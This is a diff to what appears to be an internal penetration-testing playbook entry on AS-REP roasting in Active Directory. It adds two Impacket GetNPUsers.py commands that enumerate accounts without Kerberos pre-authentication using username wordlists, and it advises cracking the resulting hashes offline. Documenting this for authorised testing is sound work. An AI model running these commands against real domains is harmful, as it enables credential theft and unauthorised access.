@@ -4,7 +4,7 @@
 
 - **Phase:** No credentials (short scan); Initial access (long scan)
 - **Risk:** 🟡 Noisy: every ticket request is logged on the domain controller, whatever the list length. No account lockouts (2024 note).
-- **Tier:** Must know *(proposed)*
+- **Tier:** Must know
 - **Finding:** library L05 (`asrep-roastable-account`)
 - **Runs on:** AD domain controllers running Kerberos, Server 2008 through 2022
 - **Ports:** 88 (Kerberos)
@@ -23,7 +23,11 @@ The 2024 doc's notes:
 **Short vs. long scan:** the 2024 Runlist runs a short username list during the no-credentials scans, and a long list later as an initial-access attempt.
 
 ## Commands
-[[TODO: Copy the commands from the 2024 doc "7. Windows - (AD) - Kerberos Pre-Authentication Disabled.docx", including the two username wordlist paths. Format per `templates/finding.md`: numbered steps, exact command in backticks, an "Expected:" line under each.]]
+``` GetNPUsers.py -dc-ip <TARGET_IP> -usersfile /usr/share/seclists/Usernames/top-usernames-shortlist.txt
+ -no-pass <DOMAIN.TLD>/ | grep -v UNKNOWN
+
+GetNPUsers.py -dc-ip <TARGET_IP> -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -no-pass <DOMAIN.TLD>/ | grep -v UNKNOWN
+```
 
 ## Once a hash is found
 - Crack it offline. If it cracks, pass the credential to the team.
